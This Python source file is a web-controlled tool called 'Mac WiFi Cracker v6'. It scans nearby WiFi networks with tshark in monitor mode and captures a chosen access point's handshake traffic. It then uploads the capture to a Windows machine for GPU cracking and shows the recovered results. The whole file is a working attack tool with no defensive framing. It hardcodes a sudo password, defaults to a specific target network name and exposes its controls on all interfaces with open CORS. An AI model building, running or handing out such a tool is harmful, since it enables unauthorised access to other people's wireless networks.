#!/usr/bin/env python3
"""
Mac WiFi Cracker v6 (port 8765) - Manual capture + one-click upload to Windows.
Reference: hcxdumptool (capture) + hcxpcapngtool (convert) + hashcat (crack)
"""
import os, sys, json, subprocess, threading, time, re
from pathlib import Path
import requests
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI(title="Mac WiFi Cracker v6")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

WINDOWS_URL = "http://192.168.1.107:8766"
TSHARK = "/usr/local/bin/tshark"
SUDO_PASS = " "  # space

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "ap_list": [],
    "capturing": False,
    "capture_file": None,
    "capture_ssid": None,
    "capture_duration": 0,
    "upload_status": None,
    "win_status": None,
    "win_results": [],
    "log": [],
}

def log(msg):
    ts = time.strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]

def run_sudo(cmd, timeout=10):
    """Run command with sudo (space password)."""
    p = subprocess.run(cmd, input=SUDO_PASS + "\n", capture_output=True, text=True, timeout=timeout)
    return p

def scan_wifi(duration=10):
    STATE["status"] = "scanning"
    STATE["message"] = f"Scanning ({duration}s)..."
    STATE["progress"] = 10
    log(f"tshark scan {duration}s")
    try:
        cap_file = f"/tmp/wifiscan_{int(time.time())}.pcap"
        # tshark monitor mode capture
        p = subprocess.Popen(
            ["sudo", "-S", TSHARK, "-i", "en0", "-I", "-y", "IEEE802_11", "-c", "300", "-w", cap_file],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        p.stdin.write(SUDO_PASS + "\n")
        p.stdin.flush()
        time.sleep(duration)
        p.terminate()
        p.wait()
        # Parse beacons
        r = subprocess.run(
            [TSHARK, "-r", cap_file, "-Y", "wlan.mgt", "-T", "fields",
             "-e", "wlan.sa", "-e", "_ws.col.essid", "-e", "wlan.channel", "-e", "wlan.signal"],
            capture_output=True, text=True, timeout=30)
        ap_list, seen = [], set()
        for line in r.stdout.strip().splitlines():
            parts = line.split('\t')
            if len(parts) >= 4:
                bssid, ssid, ch, sig = parts[0], parts[1] or "(hidden)", parts[2], parts[3]
                if bssid and bssid not in seen and ssid != "":
                    seen.add(bssid)
                    ap_list.append({"bssid": bssid, "ssid": ssid, "channel": ch,
                                    "rssi": int(sig) if sig.lstrip('-').isdigit() else 0,
                                    "security": "WPA2", "mode": "802.11"})
        ap_list.sort(key=lambda x: x["rssi"], reverse=True)
        STATE["ap_list"] = ap_list
        STATE["status"] = "idle"
        STATE["message"] = f"Found {len(ap_list)} networks"
        STATE["progress"] = 100
        log(f"Scan done: {len(ap_list)} APs")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Scan error: {e}"
        log(f"Scan error: {e}")

def start_capture(bssid, ssid, duration=60):
    STATE["status"] = "capturing"
    STATE["capturing"] = True
    STATE["capture_file"] = f"/tmp/cap_{bssid.replace(':','')}_{int(time.time())}.pcap"
    STATE["capture_ssid"] = ssid
    STATE["message"] = f"Capturing {ssid} ({duration}s)..."
    STATE["progress"] = 20
    log(f"Capture {ssid} {duration}s -> {STATE['capture_file']}")
    try:
        cap_file = STATE["capture_file"]
        p = subprocess.Popen(
            ["sudo", "-S", TSHARK, "-i", "en0", "-I", "-y", "IEEE802_11",
             "-f", f"wlan.sa == {bssid} || wlan.da == {bssid} || eapol",
             "-c", "1000", "-w", cap_file],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        p.stdin.write(SUDO_PASS + "\n")
        p.stdin.flush()
        time.sleep(duration)
        p.terminate()
        p.wait()
        STATE["capture_duration"] = duration
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture done: {cap_file}"
        STATE["progress"] = 50
        log(f"Capture saved: {cap_file}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture error: {e}"
        log(f"Capture error: {e}")

def upload_to_windows():
    STATE["status"] = "uploading"
    STATE["message"] = "Uploading to Windows..."
    STATE["progress"] = 70
    log(f"Upload {STATE['capture_file']} -> {WINDOWS_URL}")
    try:
        if not STATE["capture_file"] or not os.path.exists(STATE["capture_file"]):
            raise FileNotFoundError(STATE["capture_file"])
        ssid = STATE.get("capture_ssid") or "32H9F_5G"
        with open(STATE["capture_file"], 'rb') as f:
            r = requests.post(
                f"{WINDOWS_URL}/api/extract",
                files={"file": (os.path.basename(STATE["capture_file"]), f)},
                data={"ssid": ssid}, timeout=120)
        if r.status_code == 200:
            STATE["upload_status"] = "success"
            STATE["status"] = "idle"
            STATE["message"] = "✓ Uploaded! Windows is extracting..."
            STATE["progress"] = 80
            log("Upload OK")
        else:
            STATE["upload_status"] = f"HTTP {r.status_code}"
            STATE["status"] = "idle"
            STATE["message"] = f"Upload failed: {r.status_code}"
            log(f"Upload failed: {r.status_code}")
    except Exception as e:
        STATE["upload_status"] = str(e)
        STATE["status"] = "idle"
        STATE["message"] = f"Upload error: {e}"
        log(f"Upload error: {e}")

def poll_windows():
    """Poll Windows for crack status."""
    try:
        r = requests.get(f"{WINDOWS_URL}/api/state", timeout=5)
        d = r.json()
        STATE["win_status"] = d.get("status")
        STATE["win_results"] = d.get("results", [])
        STATE["win_progress"] = d.get("progress")
        STATE["win_message"] = d.get("message")
        STATE["win_gpu_temp"] = d.get("gpu_temp")
        STATE["win_gpu_util"] = d.get("gpu_util")
        STATE["win_speed"] = d.get("speed")
    except:
        STATE["win_status"] = "unreachable"

@app.get("/")
async def root():
    return HTMLResponse("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Mac WiFi Cracker v6</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:900px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:20px;background:#0f3460;border-radius:10px;overflow:hidden}
.progress-bar{height:100%;background:#4fc3f7;transition:width 0.3s}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;max-height:300px;overflow-y:auto}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:16px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;text-align:left;border-bottom:1px solid #0f3460}
th{color:#4fc3f7}
select,input{background:#0f3460;color:#eee;border:none;padding:8px;border-radius:4px;margin:5px}
.win-panel{background:#0f3460;padding:10px;border-radius:4px;margin:10px 0}
.win-status{color:#4fc3f7;font-weight:bold}
</style></head><body>
<h1>Mac WiFi Cracker v6</h1>
<div class="card">
<div class="status">Status: <span id="status">Loading</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Loading...</p>
</div>
<div class="card">
<h2>1. Scan</h2>
<input type="number" id="scan-dur" value="10" min="5" max="60" style="width:80px"> sec
<button onclick="scan()" id="btn-scan">Scan</button>
<table id="ap-table"><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th></th></tr></thead><tbody></tbody></table>
</div>
<div class="card">
<h2>2. Capture & Upload</h2>
<input type="number" id="cap-dur" value="60" min="10" max="300" style="width:80px"> sec
<button onclick="upload()" id="btn-upload" disabled>Upload to Windows</button>
<div id="upload-msg"></div>
</div>
<div class="card">
<h2>3. Windows Status</h2>
<div class="win-panel">
<div>Win Status: <span class="win-status" id="win-status">--</span></div>
<div>Win Message: <span id="win-message">--</span></div>
<div>GPU: <span id="win-gpu">--</span></div>
<div id="win-results"></div>
</div>
</div>
<div class="card"><h2>Log</h2><div class="log" id="log"></div></div>
<script>
function update(){fetch('/api/state').then(r=>r.json()).then(d=>{
document.getElementById('status').textContent=d.status;
document.getElementById('progress').style.width=d.progress+'%';
document.getElementById('message').textContent=d.message;
document.getElementById('log').innerHTML=d.log.join('<br>');
document.getElementById('log').scrollTop=document.getElementById('log').scrollHeight;
const tb=document.querySelector('#ap-table tbody');
tb.innerHTML=d.ap_list.map((ap,i)=>`<tr><td>${ap.ssid}</td><td>${ap.bssid}</td><td>${ap.channel}</td><td>${ap.rssi}</td>
<td><button onclick="cap(${i})" ${d.status!=='idle'?'disabled':''}>Capture</button></td></tr>`).join('');
document.getElementById('btn-scan').disabled=d.status!=='idle';
document.getElementById('btn-upload').disabled=!d.capture_file||d.status!=='idle';
document.getElementById('upload-msg').textContent=d.upload_status?('Upload: '+d.upload_status):'';
document.getElementById('win-status').textContent=d.win_status||'--';
document.getElementById('win-message').textContent=d.win_message||'--';
document.getElementById('win-gpu').textContent=d.win_gpu_temp?`${d.win_gpu_temp}°C / ${d.win_gpu_util||0}%`:'--';
document.getElementById('win-results').innerHTML=d.win_results&&d.win_results.length?
'<pre>'+d.win_results.join('\\n')+'</pre>':'';
}).catch(e=>console.error(e))}
function scan(){const d=document.getElementById('scan-dur').value||10;
fetch(`/api/scan?duration=${d}`,{method:'POST'}).then(r=>r.json()).then(update)}
function cap(i){fetch('/api/state').then(r=>r.json()).then(d=>{
const ap=d.ap_list[i];const dur=document.getElementById('cap-dur').value||60;
fetch(`/api/capture?bssid=${ap.bssid}&ssid=${encodeURIComponent(ap.ssid)}&duration=${dur}`,{method:'POST'}).then(r=>r.json()).then(update)})}
function upload(){document.getElementById('btn-upload').disabled=true;
fetch('/api/upload',{method:'POST'}).then(r=>r.json()).then(update)}
update();setInterval(update,3000);
</script></body></html>""")

@app.get("/api/state")
async def get_state():
    if STATE["upload_status"] == "success":
        poll_windows()
    return JSONResponse(STATE)

@app.post("/api/scan")
async def api_scan(duration: int = 10):
    threading.Thread(target=scan_wifi, args=(duration,), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/capture")
async def api_capture(bssid: str, ssid: str = "", duration: int = 60):
    threading.Thread(target=start_capture, args=(bssid, ssid, duration), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/upload")
async def api_upload():
    threading.Thread(target=upload_to_windows, daemon=True).start()
    return JSONResponse({"ok": True})

if __name__ == "__main__":
    log("Mac WiFi Cracker v6 starting on port 8765...")
    uvicorn.run(app, host="0.0.0.0", port=8765)
